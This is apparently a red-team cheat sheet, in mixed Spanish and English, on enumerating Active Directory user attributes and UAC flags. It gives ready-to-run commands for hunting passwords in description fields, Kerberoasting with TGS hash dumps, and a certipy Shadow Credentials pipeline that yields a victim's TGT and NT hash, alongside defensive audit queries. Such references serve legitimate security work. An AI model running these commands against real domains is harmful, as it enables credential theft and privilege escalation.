---
aliases:
  - User Attributes
  - UAC Flags Decoded
  - userAccountControl Bitfield
  - User Properties
tags:
  - type/concept
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[AD - Users Enumeration]]'
---
# AD - Users Enumeration - User Attributes & UAC Flags

***

## Critical User Attributes

| **Atributo** | **Significado** | **Para qué sirve** |
|:---:|:---:|:---:|
| `samAccountName` | Login name (legacy DOMAIN\user) | ID en logs/queries. |
| `userPrincipalName` | UPN `user@dom.local` | Modern auth. |
| `objectSid` | SID | RID extraction + cross-domain. |
| `description` | Free-text — passwords leak comunes | **Always check**. |
| `comment` / `info` | Free-text alternativos | Misma razón. |
| `mail` | Email | Phishing prep. |
| `title` / `department` / `manager` | Org metadata | OSINT + tier inference. |
| `pwdLastSet` | Last password change | Stale check (spray candidate >2y). |
| `lastLogonTimestamp` | Last logon (replicated, ~14d delay) | Live vs stale. |
| `lastLogon` | Last logon real (per-DC) | Necesita query a todos DCs. |
| `userAccountControl` | UAC bitfield | Detect flags peligrosos. |
| `memberOf` | Group memberships directos | Privilege overview. |
| `tokenGroups` | Memberships transitivos (recursive) | Tier 0 efectivo. |
| `servicePrincipalName` | SPNs | Kerberoast targets. |
| `msDS-AllowedToDelegateTo` | Constrained delegation | Privesc S4U. |
| `msDS-KeyCredentialLink` | Shadow Credentials (NgC keys) | Modern abuse vector. |
| `adminCount` | =1 si en priv group (AdminSDHolder) | Tier 0 marker. |
| `homeDirectory` / `scriptPath` / `profilePath` | UNC paths | SMB asset discovery. |
^ad-attrs-critical

```bash
# Atributos críticos en una pasada
ldapsearch -h <DC> -D 'corp\u' -w pass -b "DC=corp,DC=local" \
  "(&(objectCategory=user)(!(objectClass=computer)))" \
  samAccountName userPrincipalName description comment \
  pwdLastSet lastLogonTimestamp userAccountControl \
  memberOf servicePrincipalName \
  msDS-AllowedToDelegateTo msDS-KeyCredentialLink adminCount

# Hunt creds en free-text
ldapsearch -h <DC> -D 'corp\u' -w pass -b "DC=corp,DC=local" \
  "(&(objectCategory=user)(|(description=*pass*)(description=*pwd*)(comment=*pass*)(info=*pass*)))" \
  samAccountName description comment info
```

```powershell
# RSAT — description leak hunt
Get-ADUser -Filter * -Properties Description,Comment,Info,Title,Department |
  Where { $_.Description -match "(?i)pass|pwd|secret|cred" -or $_.Comment -match "(?i)pass" } |
  Select Name,SamAccountName,Description,Comment,Info
```

___

## userAccountControl (UAC) Flags Decoded

| **Hex** | **Decimal** | **Flag** | **Importancia** |
|:---:|:---:|:---:|:---:|
| 0x0002 | 2 | `ACCOUNTDISABLE` | Filter audit. |
| 0x0010 | 16 | `LOCKOUT` | Triage. |
| 0x0020 | 32 | `PASSWD_NOTREQD` | Vuln signal. |
| 0x0040 | 64 | `PASSWD_CANT_CHANGE` | Audit. |
| 0x0080 | 128 | `ENCRYPTED_TEXT_PWD_ALLOWED` | **Reversible encryption — DCSync recoverable**. |
| 0x0200 | 512 | `NORMAL_ACCOUNT` | Default user. |
| 0x0800 | 2048 | `INTERDOMAIN_TRUST_ACCOUNT` | Trust account TDO. |
| 0x1000 | 4096 | `WORKSTATION_TRUST_ACCOUNT` | Computer (workstation). |
| 0x2000 | 8192 | `SERVER_TRUST_ACCOUNT` | DC. |
| 0x10000 | 65536 | `DONT_EXPIRE_PASSWORD` | Static password (audit). |
| 0x40000 | 262144 | `SMARTCARD_REQUIRED` | Hardening flag. |
| 0x80000 | 524288 | `TRUSTED_FOR_DELEGATION` | **Unconstrained delegation (CRITICAL)**. |
| 0x100000 | 1048576 | `NOT_DELEGATED` | Tier 0 protection (debe estar set). |
| 0x200000 | 2097152 | `USE_DES_KEY_ONLY` | Legacy DES (vuln). |
| 0x400000 | 4194304 | `DONT_REQ_PREAUTH` | **AS-REP roastable (CRITICAL)**. |
| 0x1000000 | 16777216 | `TRUSTED_TO_AUTH_FOR_DELEGATION` | **Constrained delegation con protocol transition**. |
^ad-attrs-uac

**Bitwise filter syntax LDAP:** `userAccountControl:1.2.840.113556.1.4.803:=<decimal>`. Match exact bits set.

```bash
LS="ldapsearch -h <DC> -D 'corp\\u' -w pass -b DC=corp,DC=local"
UAC="userAccountControl:1.2.840.113556.1.4.803"

# AS-REP roastable
$LS "(&(objectCategory=user)($UAC:=4194304))" samAccountName

# Unconstrained delegation
$LS "(&(objectCategory=user)($UAC:=524288))" samAccountName

# Password not required
$LS "(&(objectCategory=user)($UAC:=32))" samAccountName

# Reversible encryption (high-value DCSync)
$LS "(&(objectCategory=user)($UAC:=128))" samAccountName

# Password never expires (static)
$LS "(&(objectCategory=user)($UAC:=65536))" samAccountName

# DES only (legacy)
$LS "(&(objectCategory=user)($UAC:=2097152))" samAccountName
```

___

## SPN (servicePrincipalName) Attribute

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `ldapsearch ... "(&(objectCategory=user)(servicePrincipalName=*))" samAccountName servicePrincipalName` | Users con SPN (kerberoastables) | Pre-attack. |
| `ldapsearch ... "(&(objectCategory=user)(servicePrincipalName=MSSQLSvc/*))"` | Solo SQL service accounts | DB targets. |
| `ldapsearch ... "(&(objectCategory=user)(servicePrincipalName=HTTP/*))"` | HTTP service accounts | Web targets. |
| `setspn -Q */*` | Todos SPNs (Windows native) | Sin LDAP tools. |
| `setspn -L <user>` | SPNs de un user | Per-user. |
| `setspn -T <foreign-dom> -Q */*` | Cross-domain | Forest-wide. |
| `Get-ADUser -Filter {ServicePrincipalName -like "*"} -Pr ServicePrincipalName` | RSAT | Standard. |
| `Get-DomainUser -SPN` (PowerView) | Adversary tool | Sin RSAT. |
| `nxc ldap <DC> -u u -p p --kerberoasting kerb.txt` | SPN enum + dump TGS hashes | Kerberoast bulk. |
| `impacket-GetUserSPNs corp.local/u:p -dc-ip <DC> -request` | Kerberoast con TGS dump | Linux. |
^ad-attrs-spn

**SPN classes comunes:** `MSSQLSvc/*`, `HTTP/*`, `CIFS/*`, `host/*`, `LDAP/*`, `RestrictedKrbHost/*`, `WSMAN/*`, `TERMSRV/*`.

```powershell
# Service accounts con SPNs (kerberoast targets)
Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName,AdminCount,LastLogonDate |
  Select Name,SamAccountName,AdminCount,LastLogonDate,
         @{n='SPNs';e={$_.ServicePrincipalName -join '; '}} |
  Sort AdminCount -Descending  # priv kerberoastable primero
```

___

## Delegation Attributes

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADUser -Filter {TrustedForDelegation -eq $true}` | Users con UD | Critical (raro en users). |
| `Get-ADUser -Filter * -Pr msDS-AllowedToDelegateTo \| ? msDS-AllowedToDelegateTo` | Users con constrained delegation | Privesc S4U. |
| `Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true}` | Users con protocol transition | S4U2Self abuse. |
| `Get-ADUser -Filter {AccountNotDelegated -eq $true}` | Users con `NOT_DELEGATED` (Tier 0 protected) | Hardening confirmar. |
| `ldapsearch ... "(&(objectCategory=user)(msDS-AllowedToDelegateTo=*))" samAccountName msDS-AllowedToDelegateTo` | LDAP raw constrained | Linux. |
^ad-attrs-delegation

**Cuándo importa:**
- Tier 0 (Domain Admins) **debe** tener `NOT_DELEGATED` ON o estar en `Protected Users` group.
- Service accounts con constrained delegation = privesc path via S4U2Self/S4U2Proxy.
- Users con UD (raro, casi siempre computers) = TGT capture potencial.

```powershell
# Audit completo delegation users
Get-ADUser -Filter {TrustedForDelegation -eq $true -or msDS-AllowedToDelegateTo -like "*" -or TrustedToAuthForDelegation -eq $true} `
  -Properties TrustedForDelegation,msDS-AllowedToDelegateTo,TrustedToAuthForDelegation,AdminCount |
  Select Name,SamAccountName,AdminCount,TrustedForDelegation,
         @{n='ConstrainedTo';e={$_.'msDS-AllowedToDelegateTo' -join '; '}},
         TrustedToAuthForDelegation
```

___

## Shadow Credentials (msDS-KeyCredentialLink)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADUser -Filter * -Pr msDS-KeyCredentialLink \| ? msDS-KeyCredentialLink` | Users con KeyCred set | Audit (anomaly hunt). |
| `Get-ADObject "CN=victim,..." -Pr msDS-KeyCredentialLink` | Per-user KeyCred entries | Forensic detail. |
| `certipy shadow auto -u u -p pass -account victim -dc-ip <DC>` | Add+abuse KeyCred (privesc) | Si tenés `WriteProperty` sobre victim. |
| `certipy shadow list -u u -p pass -account victim -dc-ip <DC>` | Listar KeyCred existentes | Pre-modify check. |
| `certipy shadow clear -u u -p pass -account victim -dc-ip <DC>` | Clear KeyCred (cleanup) | Post-engagement. |
^ad-attrs-shadowcreds

**Por qué es stealth:** no cambia password, no resetea cuenta. Solo añade public key al atributo. Auth posterior vía PKINIT (cert) → recibís TGT del victim. Stealthier que `Reset-ADAccountPassword`.

```bash
# Pipeline completo certipy
certipy shadow list -u atacante -p pass -account 'victim' -dc-ip <DC>
certipy shadow auto -u atacante -p pass -account 'victim' -dc-ip <DC>
# Output: TGT + NT hash de victim

# Cleanup
certipy shadow clear -u atacante -p pass -account 'victim' -dc-ip <DC>
```

___

## Detection / Audit Patterns

| **Comando** | **Qué detecta** | **Por qué importa** |
|:---:|:---:|:---:|
| `Get-ADUser -Filter {AdminCount -eq 1 -and whenCreated -gt (Get-Date).AddDays(-30)}` | Admin users creados últimos 30d | Atacante persistence. |
| `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true -and AdminCount -eq 1}` | DA + AS-REP roastable | Critical vuln. |
| `Get-ADUser -Filter * -Pr Description \| ? Description -match "(?i)pass\|pwd\|secret\|temp"` | Description con keywords | Cred leak. |
| `Get-ADGroupMember "Domain Admins" -Recursive \| Get-ADUser -Pr LastLogonDate,PasswordLastSet \| ? LastLogonDate -lt (Get-Date).AddDays(-180)` | DAs stale 180d | Audit cleanup. |
| `Get-ADUser -Filter * -Pr msDS-KeyCredentialLink,whenChanged \| ? {$_.'msDS-KeyCredentialLink' -and $_.whenChanged -gt (Get-Date).AddDays(-7)}` | KeyCred añadidos última semana | Shadow Cred persistence. |
| `Get-ADUser -Filter {SIDHistory -ne "$null"}` | Users con sIDHistory | Migration audit / SID History abuse. |
| `Get-ADUser -Filter * -Pr LogonCount \| ? LogonCount -eq 0` | Users nunca logueados | Stale o honey-token. |
^ad-attrs-detection

```powershell
# Snapshot priv group anomalies
Get-ADGroupMember "Domain Admins" -Recursive | Get-ADUser -Properties LastLogonDate,PasswordLastSet,whenCreated,Description |
  Select Name,SamAccountName,whenCreated,LastLogonDate,PasswordLastSet,Description |
  Sort whenCreated -Descending
```

***
